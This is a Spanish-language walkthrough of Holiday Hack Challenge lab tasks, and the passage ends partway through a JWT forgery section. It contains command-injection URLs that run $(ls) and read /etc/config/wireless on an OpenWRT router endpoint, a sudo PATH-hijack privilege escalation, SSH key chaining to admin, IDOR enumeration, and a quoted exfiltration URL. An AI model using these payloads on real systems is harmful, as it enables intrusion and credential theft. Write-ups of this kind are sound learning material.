# WriteUpHolidayChallengeCyberSec

## Acceso

Primero cliqueo a Lynn para hablar con ella
Luego cliqueo la terminal y sigo las instrucciones.

Se desbloquean los objetivos y cambia la pantalla.

# ACTO I


En la siguiente pantalla hablo con el ogro y con Jared para obtener información adicional.

Pegado a Jared hay una terminal de Visual Networking.

La cliqueo y se abre una nueva pestaña.

# Challenge 1 – DNS

### Objetivo

Resolver una consulta DNS manualmente para encontrar la dirección IP

### Procedimiento

Comienza el primer challenge de DNS.

Empiezo probando una request desde el cliente de prueba.

Primera request de prueba:

Observo la response.

Me guío con la información obtenida en la primera respuesta y ajusto la consulta.

Nueva request guiándome con la response anterior:

![DNS resuelto](image1.png)

Analizo la sección ANSWER y obtengo la IP address correspondiente.

### Resultado

Se encuentra correctamente la IP address solicitada.
Desafío superado.




# Challenge 2 – TCP Connection

### Objetivo

Comprender y ordenar correctamente el proceso del TCP Three-Way Handshake y sus flags

### Procedimiento

Antes de resolverlo:

Googleo información sobre las flags TCP y cómo funcionan.

Reviso qué significa cada flag: SYN, ACK, FIN, RST.

Cliqueo el link del TCP Three-Way Handshake dentro del juego para leer la explicación.

Repaso el flujo correcto del handshake:

Client  → SYN
Server  → SYN-ACK
Client  → ACK

Analizo las combinaciones de flags que muestra el juego y las ordeno según el proceso correcto del establecimiento de conexión TCP.

![TCP resuelto](image.png)


### Resultado

Se ordenan correctamente las flags del TCP Three-Way Handshake.
Desafío completado.

Después de completar el protocolo TCP, paso al siguiente challenge desde la terminal de Networking



# Challenge 3 – HTTP GET Request

### Objetivo
Generar manualmente una request HTTP tipo GET

### Procedimiento

Aca simplemente hay que generar una request del tipo get para http

- selecciono get que es la response que busco
- elijo la version mas vieja de http por temas de menos seguridad
- mantengo el mismo host que ya viene configurado
- agrego como user-agent id=1 por probar que me traiga un registro
- con esto se completa el challenge

```bash
GET / HTTP/1.0
Host: <mismo_host>
User-Agent: id=1
```

![HTTP GET resuelto](image2.png)

### Resultado

La response devuelve lo que estoy buscando
Challenge completado.



## Challenge 4 – TLS Handshake

### Objetivo
Ordenar correctamente los mensajes del TLS Handshake

### Procedimiento

![Inicio TLS](image%20copy.png)

Empiezo el challenge y veo que tengo un par de errores que el juego los marca

- utilizo esos errores como guia para encontrar la solucion correcta
- analizo la comunicacion entre el cliente y el servidor
- entiendo el proceso de certificacion y validacion
- coloco los mensajes en el orden correcto segun el handshake
- una vez ordenados correctamente se completa el challenge

Flujo correcto del handshake:

- Client Hello
- Server Hello
- Certificate
- Key Exchange
- Finished

![TLS Resuelto](image%20copy%202.png)
![Success](image%20copy%203.png)

### Resultado

Al ordenar correctamente los mensajes segun el flujo TLS, el challenge se completa



## Challenge 5 – HTTPS GET Request

### Objetivo
Realizar una request HTTP segura (HTTPS)

### Procedimiento
Aca por ultimo tengo que traerme una request de http segura

- ejecuto un metodo GET
- utilizo la version 2 de http
- mantengo el mismo host ya configurado
- mantengo el usuario y el user-agent ya probados anteriormente
- envio la request segura
- verifico que la response devuelva 200 ok
- confirmo que tambien me traiga el body

```bash
GET / HTTP/2
Host: <mismo_host>
User-Agent: id=1
```


![HTTPS Resuelto](image%20copy%204.png)
![HTTPS Resuelto](image%20copy%205.png)

### Resultado

La response devuelve 200 OK y el body correctamente.
Networking completado.


## Spare Key – Azure

### Objetivo
Explorar recursos en Azure y encontrar informacion sensible en una storage account

### Procedimiento

![TerminalAzure](image%20copy%206.png)

Para continuar hablo con el ganzo Barry  
me comenta sobre Azure  

- cliqueo la terminal cercana a el
- comienza el desafio Spare Key

Empiezo explorando comandos basicos de azure
https://www.economize.cloud/blog/azure-cloud-shell-commands-list/


```bash
az group list
```

Busco cuentas de storage dentro del resource group

```bash
az storage account list --resource-group rg-the-neighborhood -o table
```
![ComandoEjecutado](image%20copy%207.png)

Personalizo los comandos con el nombre encontrado anteriormente:
neighborhoodhoa

Intento listar contenedores

```bash
az storage container list --account-name neighborhoodhoa
```
![ComandoEjecutado](image%20copy%208.png)

Me devuelve error de permisos  
Reviso y agrego modo de autenticacion

```bash
az storage container list --account-name neighborhoodhoa --auth-mode login
```

![ComandoEjecutado](image%20copy%209.png)


Ahora intento listar los blobs

```bash
az storage blob list --account-name neighborhoodhoa --container-name public --auth-mode login
```

![ComandoEjecutado](image%20copy%2010.png)

No devuelve lo esperado  
Reviso nuevamente y pruebo con el contenedor que habia visto antes llamado '$web'

```bash
az storage blob list --account-name neighborhoodhoa --container-name '$web' --auth-mode login
```
![ComandoEjecutado](image%20copy%2011.png)

Esto devuelve el listado de archivos  

Analizo los archivos y veo uno sospechoso:
terraform.tfvars  
Aparece un warning de "leaked secrets"

Decido descargar su contenido
https://learn.microsoft.com/en-us/cli/azure/storage/blob?view=azure-cli-latest

Al comando encontrado en la documentacion le agrego: 
- nombre de la account que vengo usando
- container que tiene los files
- nombre del file que quiero analizar


```bash
az storage blob download \
--account-name neighborhoodhoa \
--container-name '$web' \
--name 'iac/terraform.tfvars' \![alt text](image.png)
--file /dev/stdout \
--auth-mode login
```

Esto muestra el contenido directamente en consola


![Success](image%20copy%2012.png)
![Success](image%20copy%2013.png)

### Resultado

Se logra acceder al archivo terraform.tfvars con informacion sensible.
Primer desafio de Azure completado.


## Storage Secrets – Azure

### Objetivo
Encontrar credenciales expuestas en una storage account con acceso publico

### Procedimiento

Empiezo ejecutando ayuda para conocer comandos

```bash
az help | less
```
![help](image%20copy%2014.png)

- Importante usar | less para poder scrollear en la terminal

Listo las cuentas disponibles

```bash
az account list | less
```
![accounts](image%20copy%2015.png)

Luego pruebo listar storage accounts

```bash
az storage account list | less
```
![accounts](image%20copy%2016.png)

Scrolleo la respuesta buscando algo llamativo o sospechoso  

Encuentro una cuenta con public access en true  
Decido inspeccionarla

```bash
az storage account show --name neighborhood2 | less
```
![accountsInspect](image%20copy%2017.png)

Ahora necesito listar sus contenedores

```bash
az storage container list --account-name neighborhood2
```
![containers](image%20copy%2018.png)

Esto devuelve los contenedores disponibles

Decido inspeccionar el contenedor public

```bash
az storage blob list --account-name neighborhood2 --container-name public
```
![containers](image%20copy%2019.png)

Esto devuelve el contenido del contenedor  

Veo un archivo llamado:
admin_credentials.txt

Decido descargarlo usando el mismo comando que en el desafio anterior

```bash
az storage blob download \
--account-name neighborhood2 \
--container-name public \
--name admin_credentials.txt \
--file /dev/stdout \
--auth-mode login
```

Esto muestra el contenido del archivo directamente en consola

![containers](image%20copy%2020.png)

### Resultado

Se accede al archivo admin_credentials.txt con credenciales expuestas.
Desafio completado.



## Santa’s Tracking Service

### Objetivo
Encontrar el puerto correcto en el que esta corriendo el servicio santa_tracker y conectarse a el

### Procedimiento
![ss](image%20copy%2021.png)
Primero ejecuto el comando sugerido para ver que procesos estan escuchando y en que puertos

```bash
ss -tlnp
```

![ss-tlnp](image%20copy%2022.png)

La terminal muestra los procesos activos  
Veo que hay un solo proceso escuchando  
Asumo que es el santa_tracker  

Identifico que esta corriendo en el puerto 12321

Para verificar que este funcionando correctamente hago una request local

```bash
curl localhost:12321
```

La respuesta confirma que el servicio esta activo y funcionando


![curl-localhost:12321](image%20copy%2023.png)

### Resultado

Se identifica el puerto correcto (12321) y se logra conectar al servicio.
Desafio completado.


## Fishing – It’s All About Defang

### Objetivo
Extraer todos los dominios, IPs, URLs y direcciones de email sospechosas del mail y defangearlos

### Procedimiento
Se muestra el contenido de un mail sospechoso  

El desafio pide extraer:

- dominios
- ips
- urls
- direcciones de email

Analizo el contenido del mail buscando patrones comunes de IOC

Cada dominio termina en .algo  
Cada ip son numeros separados por puntos  
Cada email contiene @  
Cada url comienza con http o https  

Voy a la pestaña Reference y copio los Common IOC Patterns  

Los pego en sus respectivos extractores  

Para IPs uso el patron:

```bash
\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}
```

Noto que faltan algunas IPs  
Modifico levemente el patron para que capture todas

Para URLs modifico el patron original de http a https? para que abarque todos los protocolos

```bash
https?://[a-zA-Z0-9-]+(\.[a-zA-Z0-9-]+)+(:[0-9]+)?(/[^\s]*)?
```

Luego reviso manualmente los resultados y elimino los que no son sospechosos  
Descarto los que pertenecen a la corporacion legitima  

Me quedo con:

![email](image%20copy%2024.png)

Dominios:

mail.icicleinnovations.mail  
dosisneighborhood.corp  

IPs:

172.16.254.1  
10.0.0.5  
192.168.1.1  
172.16.254.1  
523.555.0100  
523.555.0101  

URLs:

https://icicleinnovations.mail/renovation-planner.exe  
https://icicleinnovations.mail/upload_photos  

Emails:

sales@icicleinnovations.mail  
residents@dosisneighborhood.corp  
holiday2025-kitchen@dosisneighborhood.corp  
info@icicleinnovations.mail  

Ahora hay que defangear todo para que deje de ser clickable

Uso el convertidor con:

```bash
s/\./[.]/g; s/@/[@]/g; s/http/hxxp/g; s/:\//[://]/g
```

Esto convierte todos los indicadores a formato seguro


![emailCompletado](image%20copy%2025.png)

### Resultado

Se identifican correctamente todos los indicadores sospechosos y se defangean para enviarlos al equipo de seguridad.
Desafio completado.




## Holiday Firewall Simulator

### Objetivo
Configurar correctamente las reglas del firewall segun las practicas de seguridad indicadas

### Procedimiento
Se presentan distintas conexiones del firewall para configurar  

Lo que hago es:

- revisar la informacion que proporciona el desafio sobre cada tipo de conexion
- analizar que conexiones deben estar permitidas
- configurar solamente los puertos que corresponden
- bloquear los que no estan especificados como permitidos

Por ejemplo:

Las workstations permiten todo el trafico  
Entonces configuro todos los puertos como permitidos para ese segmento

En los otros segmentos reviso:

- puertos especificos
- protocolos
- direccion del trafico (inbound / outbound)
- principio de menor privilegio

Voy ajustando las reglas hasta que todas queden correctamente configuradas segun lo indicado

![firewall](image%20copy%2026.png)

### Resultado

Se configuran correctamente las reglas del firewall aplicando buenas practicas de seguridad.
Desafio completado.



## The Open Door – Azure NSG

### Objetivo
Inspeccionar las Network Security Groups (NSG) y detectar una regla sospechosa

### Procedimiento
Primero me pide ejecutar:

```bash
az group list
```

La respuesta devuelve un JSON  
Para verlo mas claro en una tabla ejecuto:

```bash
az group list -o table
```

Luego me pide listar las networks:

```bash
az network nsg list -o table
```

Para inspeccionar una en particular ejecuto:

```bash
az network nsg show --name nsg-web-eastus --resource-group theneighborhood-rg1 | less
```

Scrolleo para revisar configuracion

Ahora quiero listar las reglas:

```bash
az network nsg rule list --nsg-name nsg-mgmt-eastus --resource-group theneighborhood-rg2 -o table
```

![listadoReglas](image%20copy%2027.png)

Tambien reviso las default security rules permitidas:

```bash
az network nsg show --name nsg-web-eastus --resource-group theneighborhood-rg1 --query "defaultSecurityRules[?access=='Allow']" -o table
```
![listadoReglas](image%20copy%2028.png)

```bash
az network nsg show --name nsg-mgmt-eastus --resource-group theneighborhood-rg2 --query "defaultSecurityRules[?access=='Allow']" -o table
```
![listadoReglas](image%20copy%2029.png)

Luego vuelvo a listar reglas completas:

```bash
az network nsg rule list -g theneighborhood-rg2 --nsg-name nsg-mgmt-eastus
```
![listadoReglas](image%20copy%2030.png)

Empiezo a analizar:

- puertos abiertos
- protocolos
- direccion del trafico
- reglas demasiado permisivas

Identifico una regla que me parece sospechosa:

Allow-AD-Identity-Outbound

La inspecciono directamente:

```bash
az network nsg rule show -g theneighborhood-rg2 --nsg-name nsg-mgmt-eastus -n Allow-AD-Identity-Outbound
```

![listadoReglas](image%20copy%2031.png)

### Resultado

Se identifica la regla sospechosa dentro de las NSG
Desafio completado.


## Intro to Nmap

### Objetivo
Realizar escaneos con nmap para identificar puertos abiertos y servicios activos

### Procedimiento

![nmap](image%20copy%2032.png)

Primero en la terminal aparece el mensaje indicando  ejecutar una hint que devuelve una nota diciendo que cuando se ejecuta sin opciones, nmap realiza un escaneo TCP de los 1000 puertos mas comunes

Busco comandos comunes de nmap:
https://www.recordedfuture.com/threat-intelligence-101/tools-and-techniques/nmap-commands
https://www.digitalocean.com/community/tutorials/how-to-use-nmap-to-scan-for-open-ports

Me pide escanear la direccion:

127.0.12.25

Ejecuto:

```bash
nmap 127.0.12.25
```

El resultado no es muy especifico  
Decido correr entonces nmap con el parámetro -p- que indica que se ejecute con los puertos abiertos

```bash
nmap 127.0.12.25 -p-
```

Luego el desafio pide escanear un rango de direcciones IP, en este caso 20-28

Ejecuto:

```bash
nmap 127.0.12.20-28
```

Ahora me dice que nmap puede identificar que servicios corren en cada puerto  
Pregunta que servicio esta corriendo en el puerto 8080

Agrego la opcion -sV para detectar versiones:

```bash
nmap 127.0.12.25 -p 8080 -sV
```

Luego indica que puedo usar ncat para interactuar con un puerto especifico  
Debo conectarme al puerto 24601 en la direccion 127.0.12.25

Ejecuto:

```bash
ncat 127.0.12.25 24601
```

![nmap](image%20copy%2033.png)

### Resultado

Se identifican los puertos abiertos, los servicios activos y se logra interactuar con el puerto indicado.
Desafio completado.



## The Owner – Azure

### Objetivo
Identificar que suscripcion tiene un rol Owner asignado mediante PIM y analizar la membresia del grupo

### Procedimiento

Primero me pide ejecutar:

```bash
az account list --query "[].name"
```
- [] itera sobre los elementos de la lista
- .name trae el campo name de cada elemento
- El resultado esun array con los nombres de las suscripciones

Respuesta:
```bash
[
  "theneighborhood-sub",
  "theneighborhood-sub-2",
  "theneighborhood-sub-3",
  "theneighborhood-sub-4"
]
```

Luego me indica usar queries mas avanzadas con filtros condicionales  

Ejecuto:

```bash
az account list --query "[?state=='Enabled'].{Name:name, ID:id}"
```

Esto devuelve las suscripciones habilitadas con su ID correspondiente

La respuesta es un listado de cuentas a analizar:

```bash
[
  {
    "ID": "2b0942f3-9bca-484b-a508-abdae2db5e64",
    "Name": "theneighborhood-sub"
  },
  {
    "ID": "4d9dbf2a-90b4-4d40-a97f-dc51f3c3d46e",
    "Name": "theneighborhood-sub-2"
  },
  {
    "ID": "065cc24a-077e-40b9-b666-2f4dd9f3a617",
    "Name": "theneighborhood-sub-3"
  },
  {
    "ID": "681c0111-ca84-47b2-808d-d8be2325b380",
    "Name": "theneighborhood-sub-4"
  }
]
```

Ahora debo revisar que suscripcion tiene el rol Owner asignado  

Para eso ejecuto el siguiente comando utilizando el ID correspondiente

```bash
az role assignment list --scope "/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64" --query "[?roleDefinitionName=='Owner']"
```

Repito el mismo procedimiento con los demas IDs:

```bash
az role assignment list --scope "/subscriptions/4d9dbf2a-90b4-4d40-a97f-dc51f3c3d46e" --query "[?roleDefinitionName=='Owner']"
```

```bash
az role assignment list --scope "/subscriptions/065cc24a-077e-40b9-b666-2f4dd9f3a617" --query "[?roleDefinitionName=='Owner']"
```

```bash
az role assignment list --scope "/subscriptions/681c0111-ca84-47b2-808d-d8be2325b380" --query "[?roleDefinitionName=='Owner']"
```

En el grupo 3 aparece algo interesante : 
Indica que el grupo esta habilitado mediante PIM

![grupo3](image%20copy%2034.png)

Ahora debo investigar la membresia de ese grupo  

Intento listar los miembros usando el group ID que aparece:

```bash
az ad member list --group 6b452f58-6872-4064-ae9b-78742e8d987e
```

No devuelve lo esperado  

Reviso y pruebo usando el principalId encontrado en la respuesta anterior:

```bash
az ad member list --group 6b982f2f-78a0-44a8-b915-79240b2b4796
```

![grupoAnidado](image%20copy%2035.png)

La respuesta es un grupo anidado, por lo que
ahora ejecuto nuevamente el mismo comando pero con el ID del grupo anidado:

```bash
az ad member list --group 631ebd3f-39f9-4492-a780-aef2aec8c94e
```

![theOwnerCompleto](image%20copy%2036.png)

### Resultado

Se identifica la suscripcion con rol Owner habilitado por PIM y se obtiene la membresia final del grupo.
Desafio completado.



## Neighborhood Watch Bypass

### Objetivo
El objetivo es encontrar las restricciones vigentes, conseguir privilegios elevados y restaurar el control explotando configuraciones de sudo

### Procedimiento

![watchBypass](image%20copy%2037.png)

Primero verifico que permisos sudo tengo disponibles:

```bash
sudo -l
```
![watchBypass](image%20copy%2038.png)

El resultado muestra que puedo ejecutar:

/usr/local/bin/system_status.sh

Ahora quiero inspeccionar ese script 

```bash
cat /usr/local/bin/system_status.sh
```

Ahora reviso el PATH:

```bash
echo $PATH
```

Esto devuelve que tengo acceso a:

/home/chiuser/bin

![watchBypass](image%20copy%2039.png)

Listo el contenido del directorio:

```bash
ls -la /home/chiuser/bin/
```

![watchBypass](image%20copy%2040.png)

Veo algo llamativo, este runtoanwer es lo que me va a llevar correr lo que quiero:

runtoanswer -> /etc/firealarm/restore_fire_alarm

Intento ejecutarlo directamente:

```bash
/etc/firealarm/restore_fire_alarm
```

Me devuelve error de permisos  

Entonces decido crear un archivo llamado free dentro de /home/chiuser/bin

Primero me aseguro de estar en el directorio correcto:

```bash
cd /home/chiuser/bin
```

Creo el archivo:

```bash
nano free
```

Dentro del archivo agrego el comando:

```bash
/etc/firealarm/restore_fire_alarm
```

Ahora le doy permisos de ejecucion:

https://stackoverflow.com/questions/8328481/chmod-777-to-a-folder-and-all-contents

```bash
chmod 777 free
```

Finalmente ejecuto el script permitido con sudo:

```bash
sudo /usr/local/bin/system_status.sh
```

El sistema ejecuta el comando dentro de free y logra restaurar el control

![watchBypass](image%20copy%2041.png)

### Resultado

Se encontraron las restricciones vigentes, conseguir privilegios elevados y restaurar el control.
Desafio completado.




# ACTO II

Para esto acto utilizo una máquina virtual Kali Linux en VirtualBox

## Dosis Network Down

### Objetivo
Encontrar la contraseña del wifi explotando una vulnerabilidad en el router

### Procedimiento

Se abre una pagina de login

![watchBypass](image%20copy%2042.png)

Empiezo probando contraseñas comunes:

password  
password123  
notpassword  

Luego del tercer intento el sistema indica intentar desde consola 

![watchBypass](image%20copy%2043.png)

Investigo sobre vulnerabilidades del router segun su version  

Encuentro un blog que describe una vulnerabilidad de inyeccion:

https://www.tenable.com/security/research/tra-2023-11

El endpoint vulnerable es:

/cgi-bin/luci/;stok=/locale

Construyo la siguiente URL:

```bash
https://dosis-network-down.holidayhackchallenge.com/cgi-bin/luci/;stok=/locale
```

El blog indica ejecutar la consulta dos veces seguidas  

Agrego el parametro form=country:

```bash
https://dosis-network-down.holidayhackchallenge.com/cgi-bin/luci/;stok=/locale?form=country
```

Luego modifico para ejecutar comandos:

```bash
https://dosis-network-down.holidayhackchallenge.com/cgi-bin/luci/;stok=/locale?form=country&country=$(ls)
```

La primera vez devuelve ok  
La segunda vez devuelve el listado de archivos

![watchBypass](image%20copy%2043.png)

Esto confirma que tengo ejecucion remota de comandos  

Investigo que el router usa OpenWRT  

https://openwrt.org/docs/guide-user/network/wifi/basic

Las configuraciones wifi se encuentran en:

/etc/config/wireless

Para ver el contenido ejecuto:

```bash
https://dosis-network-down.holidayhackchallenge.com/cgi-bin/luci/;stok=/locale?form=country&country=$(cat /etc/config/wireless)
```

La primera vez devuelve ok  
La segunda vez muestra el contenido del archivo

![watchBypass](image%20copy%2044.png)

En el archivo encuentro:

option key 'SprinklesAndPackets2025!'

Identifico que esa es la contraseña del wifi

Vuelvo al juego  
En los objetivos hay un input para ingresar la contraseña  

Ingreso:
SprinklesAndPackets2025!

### Resultado

Exploté la vulnerabilidad de inyeccion en el router OpenWRT y obtuve la contraseña del wifi.
Desafio completado.



## Retro Recovery

### Objetivo

En este reto debo analizar una imagen de un disquete retro para recuperar archivos eliminados


## Procedimiento

Intento montar la imagen en Windows, pero el sistema me muestra un mensaje indicando que el archivo está corrupto.

Esto me hace pensar que puede haber información eliminada o estructuras dañadas dentro del sistema de archivos, por lo que decido utilizar una herramienta forense más avanzada.


## 2. Análisis con TestDisk

Para analizar la imagen utilizo **TestDisk**, una herramienta incluida en Kali Linux que permite recuperar particiones y archivos eliminados.

Me dirijo al directorio donde se encuentra la imagen y ejecuto:

```bash
"testdisk ../../Desktop/floppy.img"
```

Selecciono el archivo `floppy.img` de la lista de medios detectados.

![retro](image%20copy%2071.png)


## 3. Tipo de tabla de particiones

TestDisk no detecta automáticamente una tabla válida, por lo que acepto la opción por defecto:

"none"


## 4. Sistema de archivos

La herramienta detecta que el sistema de archivos es:

FAT12

Selecciono la partición FAT12 para continuar.

## 5. Listado de archivos

Luego selecciono la opción:

"List"

Esto me muestra el contenido del sistema de archivos, incluyendo archivos eliminados.

Entre los archivos encuentro uno que me llama la atención:

all_i-want_for_christmas.bas

![retro](image%20copy%2072.png)

## 6. Recuperación del archivo

Selecciono el archivo y presiono:

"c"

Para copiarlo.

Elijo el directorio de destino y vuelvo a presionar:

"c"

cuando la operación es exitosa, testDisk me confirma que el archivo fue copiado correctamente.

## 7. Análisis del contenido

Abro el archivo recuperado en un editor de texto.

El contenido corresponde a un programa en BASIC con aproximadamente 570 líneas que describen una simulación relacionada con Star Trek, lo cual coincide con la pista que mencionaba buscar un “tesoro clásico”.

Revisando el archivo, encuentro una cadena codificada en Base64:

bWVycnkgY2hyaXN0bWFzIHRvIGFsbCBhbmQgdG8gYWxsIGEgZ29vZCBuaWdodAo=

![retro](image%20copy%2073.png)


## 8. Decodificación

Decido decodificar la cadena en la web utilizando un programa para esto

![retro](image%20copy%2074.png)

El resultado me devuelve el mensaje correspondiente a la bandera del reto.

![retro](image%20copy%2075.png)

## Resultado

Después de recuperar el archivo eliminado y decodificar la cadena en Base64, logro obtener la bandera.

Con esto doy por completado el desafio Retro Recovery.


## Mail Detective

### Objetivo

Acceder al servidor IMAP usando curl, revisar los correos en la carpeta Spam y encontrar la URL utilizada en una función maliciosa.

### Procedimiento

Primero debo conectarme al servidor IMAP para obtener un listado de las carpetas disponibles.
Para esto utilizo curl junto con las credenciales y el puerto que proporciona la consola:

```bash
curl imap://dosismail:holidaymagic@127.0.0.1
```

![imap](image%20copy%2047.png)

Las carpetas lucen normales como las de cualquier cliente de correo (Inbox, Spam, etc.), por lo que el siguiente paso es verificar cuántos correos hay en la carpeta Spam.
Para eso ejecuto:

```bash
curl imap://dosismail:holidaymagic@127.0.0.1/Spam?*
```

Esto devuelve que la carpeta Spam contiene 3 mails

Ahora necesito ver el contenido de esos correos.
Para esto utilizo la carpeta junto con MAILINDEX indicando el número de mail que quiero leer.
https://everything.curl.dev/usingcurl/reademail.html

Primero intento:

```bash
curl imap://dosismail:holidaymagic@127.0.0.1/Spam;MAILINDEX=1
```

No funciona de esa forma, por lo que pruebo agregando comillas:

```bash
curl "imap://dosismail:holidaymagic@127.0.0.1/Spam;MAILINDEX=1"
```

Esto devuelve el contenido del primer mail
En este mail no encuentro la URL asi que paso al siguiente

```bash
curl "imap://dosismail:holidaymagic@127.0.0.1/Spam;MAILINDEX=2"
```

![imap](image%20copy%2048.png)

El body del segundo mail no muestra la url en la funcion exfiltrateData()
var pastebinUrl = "https://frostbin.atnas.mail/api/paste";

![imap](image%20copy%2049.png)


Ahora lo que queda es introducirla en el input del desafio

https://frostbin.atnas.mail/api/paste


De esta forma completo el desafio

### Resultado

Se logra identificar la URL utilizada para exfiltración de datos dentro del segundo correo de la carpeta Spam.
Desafío completado.


## Quantgnome Leap


## Objetivo

Comenzamos como el usuario qgnome. 
El objetivo es escalar entre usuarios usando las claves SSH hasta llegar a admin, quien tiene acceso a la flag.


## Procedimiento

```bash
pwd
ls -lah
```
![leap](image%20copy%2051.png)

Veo la carpeta .ssh, entonces entro:

```bash
cd .ssh
ls -lah
```

![leap](image%20copy%2052.png)

Encuentro id_rsa e id_rsa.pub.
Reviso la clave pública:

```bash
cat id_rsa.pub
```

![leap](image%20copy%2053.png)

Pertenece a gnome1.

Reviso en qué puerto corre SSH:

```bash
cat /opt/oqs-ssh/sshd_config
```

El servicio corre en el puerto 2222.

Me conecto usando la clave privada:

```bash
ssh gnome1@localhost -p 2222 -i ~/.ssh/id_rsa
```

![leap](image copy 54.png)

Accedo correctamente como gnome1.

Ya como gnome1:

```bash
cd ~/.ssh
ls -lah
```

![leap](image%20copy%2055.png)

Encuentro id_ed25519 e id_ed25519.pub.

```bash
cat id_ed25519.pub
```

```bash
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKUOOPy0e1+4EzuM5PYc1/lfsXrR9FFDxTxDztvCi0Ce gnome2
```

La clave pertenece a gnome2.

Me conecto:

```bash
ssh gnome2@localhost -p 2222 -i id_ed25519
```

![leap](image%20copy%2056.png)

Accedo como gnome2.

```bash
cd ~/.ssh
ls -lah
```
![leap](image%20copy%2057.png)
```bash
cat id_mayo2.pub
```

La clave es de gnome3.

![leap](image%20copy%2058.png)

```bash
ssh gnome3@localhost -p 2222 -i id_mayo2
```

![leap](image%20copy%2059.png)

Accedo correctamente.

```bash
cd ~/.ssh
ls -lah
```
![leap](image%20copy%2060.png)

```bash
cat id_ecdsa_nistp256_sphincssha2128fsimple.pub
```

```bash
ssh-ecdsa-nistp256-sphincssha2128fsimple AAAAKHNzaC1lY2RzYS1uaXN0cDI1Ni1zcGhpbmNzc2hhMjEyOGZzaW1wbGUAAAAIbmlzdHAyNTYAAABBBL6fN38B6kQNiS0vAvGeGjAJ7Da2YbpBaAXkeeDJ3CJIUZc8PzNWCfzW5qN8z0RnS1/Hia1jRt6dydqeiVHBa9cAAAAgRAPMBt8y/4/YdBEw9OutMv37HJy50gIQfmzUY5d82Bg= gnome4
```

La clave pertenece a gnome4.

```bash
ssh gnome4@localhost -p 2222 -i id_ecdsa_nistp256_sphincssha2128fsimple
```

![leap](image%20copy%2061.png)

Accedo como gnome4.

```bash
cd ~/.ssh
ls -lah
![leap](image%20copy%2062.png)
```

```bash
cat id_ecdsa_nistp521_mldsa87.pub
```

![leap](image%20copy%2063.png)

La clave corresponde a admin.

```bash
ssh admin@localhost -p 2222 -i id_ecdsa_nistp521_mldsa87
```

![leap](image%20copy%2064.png)


Ahora tengo acceso como admin.

```bash
cd /opt/oqs-ssh/flag
ls
cat flag
```

Devuelve:

![leap](image%20copy%2065.png)

Ingreso HHC{L3aping_0v3r_Quantum_Crypt0} y completo el desafío.


## REsultado

Logré encadenar accesos SSH entre usuarios utilizando las claves privadas encontradas en cada carpeta .ssh. De esta forma llegué al admin, que tiene permisos para acceder a la flag.



## IDORable Distro

## Objetivo

Encontrar el nombre del gnomo que pidió sushi congelado explotando una posible vulnerabilidad IDOR en el sistema de recibos del restaurante.


## Procedimiento

Debo buscar un recibo fuera del restaurante. 
En el lateral derecho encontramos un código QR.

Al escanearlo obtenemos una URL similar a:

```bash
https://its-idorable.holidayhackchallenge.com/receipt/i9j0k1l2
```

La página muestra un recibo en formato web, pero no contiene sushi congelado

![sushi](image%20copy%2066.png)

Para analizar cómo funciona el sistema, configuro BURP como proxy y observo el tráfico HTTP (con intercept desactivado).

![sushi](image%20copy%2067.png)
![sushi](image%20copy%2068.png)
En HTTP History veo dos requests importantes:

```bash
GET /receipt/...
GET /api/receipt/...
```

El primero devuelve el HTML.
El segundo devuelve la información real del recibo en formato JSON.

Me enfoco en:

```bash
GET /api/receipt/103
```

El id 103 corresponde al recibo actual.

Para comprobar si existe un IDOR, envío la request a Repeater y modifico el id manualmente:

![sushi](image%20copy%2069.png)

```bash
GET /api/receipt/102
GET /api/receipt/101
```

El servidor devuelve otros recibos válidos, lo que confirma que el identificador es predecible y no hay control de acceso adecuado.

Como los IDs parecen secuenciales, envío la request a Intruder para automatizar pruebas.

![sushi](image%20copy%2070.png)

Configuro un ataque numérico probando IDs desde 101 hasta 150.

Ejecuto el ataque y reviso las respuestas buscando algún recibo que contenga “frozen sushi”.


## Resultado

En el id 139 encuentro un recibo que incluye sushi congelado

El nombre asociado al pedido es:

Bartholomew Quibblefrost, ingreso esto y desafío completado.


## Going in Reverse

## Objetivo

Entender cómo funciona el sistema de validación en el archivo BASIC y extraer la contraseña y la bandera a partir del código.


## Procedimiento

Kevin nos entrega el archivo login.bas. 

Al revisarlo, identifico dos variables importantes:

```bash
ENC_PASS$ = "D13URKBT"
ENC_FLAG$ = "DSA|auhts*wkfi=dhjwubtthut+dhhkfis+hnkz"
```

El programa solicita una contraseña y realiza estas acciones:

1. Verifica que el largo coincida.
2. Recorre cada carácter.
3. Aplica XOR 7 al carácter ingresado.
4. Compara el resultado con el valor almacenado en ENC_PASS$.
5. Si todo coincide, aplica la misma operación XOR 7 sobre ENC_FLAG$ y la imprime.

Esto indica que tanto la contraseña como la bandera están transformadas usando XOR con clave 7.

Dado que XOR es simétrico, puedo aplicar la misma operación nuevamente para obtener los valores originales.

Para hacerlo más rápido, replico la lógica en Python:

```python
def transform(text):
    output = ""
    for ch in text:
        output += chr(ord(ch) ^ 7)
    return output

print(transform("D13URKBT"))
print(transform("DSA|auhts*wkfi=dhjwubtthut+dhhkfis+hnkz"))
```


## Resultado

El script devuelve:
```bash
C64RULES
CTF{frost-plan:compressors,coolant,oil}
```

La contraseña real es C64RULES y la bandera es CTF{frost-plan:compressors,coolant,oil}.

Logré identificar el uso de XOR 7 y revertir la operación.


## Rogue Gnome Identity Provider

### Objetivo

Escalar privilegios modificando un JWT para acceder al panel administrativo y descubrir el firmware instalado.


## 1. Obtener un JWT válido

Usamos las credenciales encontradas en el archivo notes para autenticarnos contra el IdP:

```bash
curl -X POST --data-binary $'username=gnome&password=SittingOnAShelf&return_uri=http%3A%2F%2Fgnome-48371.atnascorp%2Fauth' http://idp.atnascorp/login
```

La respuesta nos devuelve un token JWT firmado con RS256.

Token:
```bash
